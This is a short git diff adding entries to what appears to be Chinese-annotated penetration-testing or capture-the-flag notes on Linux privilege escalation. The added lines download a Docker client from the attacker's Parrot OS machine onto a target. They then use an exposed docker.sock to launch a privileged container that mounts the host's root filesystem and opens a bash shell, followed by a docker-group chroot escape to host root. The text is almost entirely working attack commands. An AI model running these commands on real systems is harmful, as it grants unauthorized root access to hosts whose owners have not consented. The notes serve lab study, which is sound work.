@@ -137,3 +137,16 @@ lxc exec privesc /bin/sh                                                        
 cat /mnt/root/flag.txt
 
 
+wget https://<parrot-os>:443/docker -O docker                 从攻击机（Parrot OS）下载 Docker 客户端二进制到目标机
+  https://master.dockerproject.com/linux/x86_64/docker        官方二进制文件
+chmod +x docker
+/tmp/docker -H unix:///app/docker.sock ps         Docker 子命令，列出运行中的容器（标准写法：docker ps）
+/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app      创建 main_app 容器，挂载宿主机根目录 /
+/tmp/docker -H unix:///app/docker.sock ps                                         查看容器的 ID
+/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash            进入容器，启动 bash
+或作为docker组成员，用已有镜像
+docker image ls                                               找可用镜像
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash            创建进入容器，chroot 更改进程根目录，启动 bash
+
+
+
